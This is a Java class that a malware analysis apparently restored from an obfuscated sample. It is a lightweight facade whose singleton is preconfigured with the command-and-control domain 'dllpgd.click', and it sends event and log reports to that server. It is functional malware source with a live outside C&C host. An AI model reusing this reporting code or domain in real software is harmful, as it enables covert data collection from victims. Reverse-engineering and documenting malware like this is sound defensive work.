package c2;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: c13.nim5.ez8.h5_proto.H5Lite
 *
 * Lightweight SDK facade for event and log reporting to the C&C server.
 * Pre-configured singleton with the C&C domain "dllpgd.click".
 * Provides a simplified API surface over HttpGatewayClient.
 */
public class H5Lite {

    /** Singleton instance connected to the C&C domain: dllpgd.click */
    public static final H5Lite INSTANCE = new H5Lite("dllpgd.click");

    private final HttpGatewayClient httpClient;

    public H5Lite(String domain) {
        this.httpClient = new HttpGatewayClient(domain);
    }

    public H5Lite(String domain, int port, boolean useHttps) {
        this.httpClient = new HttpGatewayClient(domain, port, useHttps);
    }

    public CommonResponse updateEvent(UpdateEventRequest request) throws Exception {
        return this.httpClient.updateEvent(request);
    }

    public CommonResponse updateLog(UpdateLogRequest request) throws Exception {
        return this.httpClient.updateLog(request);
    }
}
